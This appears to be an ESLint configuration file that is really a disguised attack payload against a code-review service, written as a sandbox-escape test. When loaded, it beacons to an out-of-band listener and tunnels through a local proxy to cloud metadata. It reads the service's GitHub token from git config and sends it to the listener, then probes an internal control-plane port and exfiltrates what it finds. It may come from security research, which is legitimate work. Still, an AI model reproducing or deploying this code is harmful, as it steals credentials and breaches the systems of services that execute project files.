// CodeRabbit RCE — COMBINED decisive escape test (one slot, lean).
// T1 control tunnel · T2 metadata via TLS-over-tunnel · T3 tokenizer token-exfil · T4 internal SSRF.
var C = 'd8sr8ajoeaqodmubkvmgsfkh7b4dww7hk.oast.online';
var http = require('http'), dns = require('dns'), net = require('net'), tls = require('tls'), cp = require('child_process');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 700), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive16.' + C, function () {}); } catch (e) {}

var connectThen = function (host, port, tag, cb) {
  try {
    var s = net.connect({ host: '127.0.0.1', port: 1080, timeout: 12000 }); var hdr = '', tun = false;
    s.on('connect', function () { s.write('CONNECT ' + host + ':' + port + ' HTTP/1.1\r\nHost: ' + host + ':' + port + '\r\n\r\n'); });
    s.on('data', function (d) { if (!tun) { hdr += d.toString('latin1'); if (/\r\n\r\n/.test(hdr)) { tun = true; var l = hdr.split('\r\n')[0]; httpX(tag + '_c', l); if (/ 200/.test(l)) { try { cb(s); } catch (e) {} } else { try { s.destroy(); } catch (e) {} } } } });
    s.on('error', function (e) { httpX(tag + '_c', 'ERR:' + ((e && e.code) || e)); });
    s.on('timeout', function () { httpX(tag + '_c', 'TO'); try { s.destroy(); } catch (e) {} });
  } catch (e) { httpX(tag + '_c', 'EXC'); }
};
var tlsReq = function (s, sni, reqLines, onResp) {
  try { var t = tls.connect({ socket: s, servername: sni, rejectUnauthorized: false, timeout: 8000 }, function () { t.write(reqLines); });
    var r = ''; t.on('data', function (d) { r += d.toString('latin1'); }); t.on('close', function () { if (onResp) onResp(r); }); t.on('error', function () {}); } catch (e) {}
};

// T1 — control: tunnel relays this run (marker /CTRL16 lands on listener)
connectThen(C, 443, 'ctrl', function (s) { tlsReq(s, C, 'GET /CTRL16 HTTP/1.1\r\nHost: ' + C + '\r\nConnection: close\r\n\r\n'); });

// T2 — metadata via TLS-over-tunnel (SA email = host identity = escape proof; NOT token)
connectThen('metadata.google.internal', 80, 'md', function (s) {
  tlsReq(s, 'metadata.google.internal', 'GET /computeMetadata/v1/instance/service-accounts/default/email HTTP/1.1\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n', function (r) { httpX('md_r', r.slice(0, 300)); });
});

// T3 — tokenizer token-exfil: inject CR's real GitHub token into a request forwarded to OUR listener
cp.exec('git config --get http.extraheader', { timeout: 6000 }, function (e, out) {
  var raw = (out || '').trim(); var m = raw.match(/^([^:]+):\s*([\s\S]*)$/);
  var hn = m ? m[1].trim() : 'Proxy-Tokenizer', hv = m ? m[2].trim() : raw;
  connectThen(C, 443, 'leak', function (s) { tlsReq(s, C, 'GET /LEAK16 HTTP/1.1\r\nHost: github.com\r\n' + hn + ': ' + hv + '\r\nConnection: close\r\n\r\n'); });
});

// T4 — internal SSRF: host-side control-plane port via CONNECT+TLS
connectThen('127.0.0.1', 6443, 'int', function (s) { tlsReq(s, 'localhost', 'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', function (r) { httpX('int_r', r.slice(0, 200)); }); });

module.exports = { root: true, rules: {} };
